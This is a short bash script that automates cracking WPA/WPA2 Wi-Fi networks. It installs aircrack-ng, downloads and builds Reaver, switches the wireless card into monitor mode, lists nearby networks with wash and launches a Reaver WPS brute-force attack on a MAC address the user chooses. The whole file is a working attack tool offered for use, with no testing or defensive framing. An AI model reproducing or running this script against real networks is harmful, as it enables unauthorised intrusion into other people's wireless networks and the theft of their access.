cd /home/ano/dump
clear
echo "this script will crack wpa\wpa2, using Reaver and aircrack-ng, just follow instruction"
echo "if you dont know what is your wireless lan interface press s for show or c to continue"
echo "if youre not sure you have the right progrmas to use this script press d for dependencis"
read iwconfig1
if [ $iwconfig1 = "s" ]; then
	iwconfig; echo "which wlan interface to start wlan0, wlan1, etc... "
elif [ $iwconfig1 = "d" ]; then
	apt-get install aircrack-ng libpcap-dev libpcap-ruby libpcap-ruby1.8 libsqlite0-dev libsqlite0 libsqlite3-dev gnome-terminal 
	wget http://reaver-wps.googlecode.com/files/reaver-1.4.tar.gz
	tar -zxvf reaver-1.4.tar.gz
	cd reaver-1.4/
	cd src/
	./configure
	make && make install
	clear
	echo "which wlan interface to start wlan0, wlan1, etc... "
	
	

else
	echo "which wlan interface to start wlan0, wlan1, etc... "
fi	
read wlanI
ifconfig $wlanI down
sudo iwconfig $wlanI mode monitor 
ifconfig $wlanI up
echo "wait for around a minute until you get the MAC number of the WPA\WPA2 you want to crack"
echo "and then use Ctrl + c to kill and continue"
echo "press Enter when ready to continue"
read
gnome-terminal --tab -e "wash -i $wlanI" 
echo "now enter the mac adress you want to crack, like this 00:00:00:00:00"
read MA
reaver -i $wlanI -b $MA -vv -a
